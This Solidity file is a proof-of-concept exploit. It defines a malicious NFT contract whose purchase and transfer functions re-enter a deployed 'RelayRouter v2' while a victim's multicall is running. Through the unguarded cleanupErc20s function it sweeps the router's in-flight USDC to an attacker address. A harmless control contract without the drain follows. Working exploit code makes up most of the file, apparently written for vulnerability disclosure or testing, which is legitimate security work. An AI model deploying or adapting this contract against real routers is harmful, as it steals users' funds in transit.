// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

/// @notice Minimal ERC721 used ONLY as a PoC attack contract.
/// @dev Models a malicious NFT collection. Its `safeTransferFrom` drains the
///      RelayRouter's in-flight ERC20 balance via the permissionless,
///      reentrancy-unguarded `cleanupErc20s` BEFORE completing the transfer.
///      This mirrors a real NFT-purchase flow: the victim's multicall invokes
///      the collection to move the NFT to the router, and the collection
///      re-enters the router mid-multicall.
interface IRelayRouterCleanup {
    function cleanupErc20s(
        address[] calldata tokens,
        address[] calldata recipients,
        uint256[] calldata amounts
    ) external;
}

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract MaliciousNFT {
    address public immutable router;
    address public immutable usdc;
    address public immutable attacker;

    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => address) public getApproved;
    mapping(address => uint256) public balanceOf;
    bool public drained;

    event Transfer(address indexed from, address indexed to, uint256 indexed id);

    constructor(address _router, address _usdc, address _attacker) {
        router = _router;
        usdc = _usdc;
        attacker = _attacker;
    }

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
        balanceOf[to] += 1;
        emit Transfer(address(0), to, id);
    }

    function approve(address to, uint256 id) external {
        require(ownerOf[id] == msg.sender, "not owner");
        getApproved[id] = to;
    }

    /// @notice Purchase entrypoint, invoked by the victim's multicall.
    /// @dev The seller approved THIS contract when listing the NFT, so
    ///      the collection itself is the authorized operator. The transfer
    ///      is done inline (not via the public safeTransferFrom) so the
    ///      operator check is against address(this).
    function buy(uint256 id) external {
        address from = ownerOf[id];
        require(
            getApproved[id] == address(this) || from == msg.sender,
            "not approved"
        );
        _drainOnce();

        ownerOf[id] = router;
        balanceOf[from] -= 1;
        balanceOf[router] += 1;
        getApproved[id] = address(0);
        emit Transfer(from, router, id);

        // Standard ERC721 receiver callback: the router forwards the NFT
        // to the multicall's nftRecipient.
        bytes4 ret = IERC721Receiver(router).onERC721Received(
            address(this),
            from,
            id,
            ""
        );
        require(ret == IERC721Receiver.onERC721Received.selector, "bad receiver");
    }

    function _drainOnce() internal {
        // ---- ATTACK: re-enter the router mid-multicall ----
        // The router is executing the victim's multicall and currently
        // holds the victim's in-flight USDC. `cleanupErc20s` is
        // permissionless and has NO reentrancy guard in the deployed
        // RelayRouter v2, so this succeeds while the multicall is running.
        if (drained) return;
        drained = true;
        address[] memory tokens = new address[](1);
        tokens[0] = usdc;
        address[] memory recipients = new address[](1);
        recipients[0] = attacker;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 0; // 0 = full router balance
        IRelayRouterCleanup(router).cleanupErc20s(tokens, recipients, amounts);
        // ---- END ATTACK ----
    }

    function safeTransferFrom(address from, address to, uint256 id) public {
        require(ownerOf[id] == from, "not owner");
        require(
            msg.sender == from || getApproved[id] == msg.sender,
            "not approved"
        );
        _drainOnce();
        ownerOf[id] = to;
        balanceOf[from] -= 1;
        balanceOf[to] += 1;
        getApproved[id] = address(0);
        emit Transfer(from, to, id);

        // Standard ERC721 receiver callback.
        if (to.code.length > 0) {
            bytes4 ret = IERC721Receiver(to).onERC721Received(
                msg.sender,
                from,
                id,
                ""
            );
            require(
                ret == IERC721Receiver.onERC721Received.selector,
                "bad receiver"
            );
        }
    }

    /// @notice 5-arg overload used by the router's onERC721Received hook
    ///         (safeTransferFrom with data). Delegates to the 4-arg version.
    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        bytes calldata
    ) external {
        safeTransferFrom(from, to, id);
    }
}

/// @notice Benign control: identical collection WITHOUT the drain.
contract BenignNFT {
    address public immutable usdc;

    mapping(uint256 => address) public ownerOf;
    mapping(uint256 => address) public getApproved;
    mapping(address => uint256) public balanceOf;

    event Transfer(address indexed from, address indexed to, uint256 indexed id);

    constructor(address _usdc) {
        usdc = _usdc;
    }

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
        balanceOf[to] += 1;
        emit Transfer(address(0), to, id);
    }

    function approve(address to, uint256 id) external {
        require(ownerOf[id] == msg.sender, "not owner");
        getApproved[id] = to;
    }

    /// @notice Honest purchase: NFT to router, payment router -> seller.
    /// @dev Payment is a separate multicall call in the test; this function
    ///      only moves the NFT. Seller approved THIS contract on listing.
    function buy(uint256 id) external {
        address from = ownerOf[id];
        require(
            getApproved[id] == address(this) || from == msg.sender,
            "not approved"
        );
        ownerOf[id] = msg.sender;
        balanceOf[from] -= 1;
        balanceOf[msg.sender] += 1;
        getApproved[id] = address(0);
        emit Transfer(from, msg.sender, id);
        bytes4 ret = IERC721Receiver(msg.sender).onERC721Received(
            address(this),
            from,
            id,
            ""
        );
        require(ret == IERC721Receiver.onERC721Received.selector, "bad receiver");
    }

    function safeTransferFrom(address from, address to, uint256 id) public {
        require(ownerOf[id] == from, "not owner");
        require(
            msg.sender == from || getApproved[id] == msg.sender,
            "not approved"
        );
        ownerOf[id] = to;
        balanceOf[from] -= 1;
        balanceOf[to] += 1;
        getApproved[id] = address(0);
        emit Transfer(from, to, id);
        if (to.code.length > 0) {
            bytes4 ret = IERC721Receiver(to).onERC721Received(
                msg.sender,
                from,
                id,
                ""
            );
            require(
                ret == IERC721Receiver.onERC721Received.selector,
                "bad receiver"
            );
        }
    }

    /// @notice 5-arg overload used by the router's onERC721Received hook.
    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        bytes calldata
    ) external {
        safeTransferFrom(from, to, id);
    }
}
